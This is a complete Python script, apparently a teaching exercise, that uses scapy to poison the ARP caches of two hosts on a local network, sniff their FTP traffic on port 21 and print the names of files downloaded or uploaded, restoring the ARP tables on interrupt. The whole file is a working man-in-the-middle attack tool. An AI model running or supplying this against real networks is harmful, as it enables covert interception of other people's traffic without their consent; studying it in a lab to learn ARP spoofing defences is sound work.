#!/usr/local/bin/python3
import argparse
import scapy.all as scapy
import re
import time
import signal

def error_exit(msg):
	print(f"Error: {msg}")
	exit(1)

def spoof(ip_target, mac_target, ip_src):
	packet = scapy.ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, op='is-at')
	scapy.send(packet, verbose=0, count=7)
	print(f" --- ARP Table soofed at {ip_target} --- ")

def restore(ip_target, mac_target, ip_src, mac_src):
	packet = scapy.ARP(pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src, op='is-at')
	scapy.send(packet, verbose=0, count=7)
	print(f" --- ARP Table restored at {ip_target} --- ")

class Inquisitor:
	def __init__(self, args):
		self.ip_target = args.ip_target
		self.mac_target = args.mac_target
		self.ip_src = args.ip_src
		self.mac_src = args.mac_src

	def packet_callback(self, packet):
		if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
			payload = packet[scapy.Raw].load
			if b"RETR" in payload:
				print(f"Downloading: {payload.decode()[5:-2]}")
			elif b"STOR" in payload:
				print(f"Uploading: {payload.decode()[5:-2]}")

	def exit_gracefully(self, signum, frame):
		restore(self.ip_target, self.mac_target, self.ip_src, self.mac_src)
		restore(self.ip_src, self.mac_src, self.ip_target, self.mac_target)
		exit(1)

	def poison(self):
		try:
			signal.signal(signal.SIGINT, self.exit_gracefully)

			spoof(self.ip_target, self.mac_target, self.ip_src)
			spoof(self.ip_src, self.mac_src, self.ip_target)
			scapy.sniff(iface="eth0", prn=self.packet_callback, filter="tcp port 21")
		except Exception as e:
			error_exit(e)

def is_valid_ip(ip_str):
	try:
		nums = ip_str.split('.')
		if len(nums) != 4:
			return False
		for n in nums:
			if int(n) < 0 or 255 < int(n):
				return False
		return True
	except:
		return False

def is_valid_mac(mac_str):
	mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
	return bool(mac_pattern.match(mac_str))

def validate_args(args):
	try:
		if not is_valid_ip(args.ip_src):
			error_exit("Invalid IP-src")
		if not is_valid_mac(args.mac_src):
			error_exit("Invalid MAC-src")
		if not is_valid_ip(args.ip_target):
			error_exit("Invalid IP-target")
		if not is_valid_mac(args.mac_target):
			error_exit("Invalid MAC-target")
	except Exception as e:
		error_exit(e)

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("ip_src", type=str, help="IP-src")
	parser.add_argument("mac_src", type=str, help="MAC-src")
	parser.add_argument("ip_target", type=str, help="IP-target")
	parser.add_argument("mac_target", type=str, help="MAC-target")
	args = parser.parse_args()

	return args

def main():
	try:
		args = parse_args()
		validate_args(args)
		inquisitor = Inquisitor(args)
		inquisitor.poison()
	except Exception as e:
		error_exit(e)


if __name__ == '__main__':
	main()
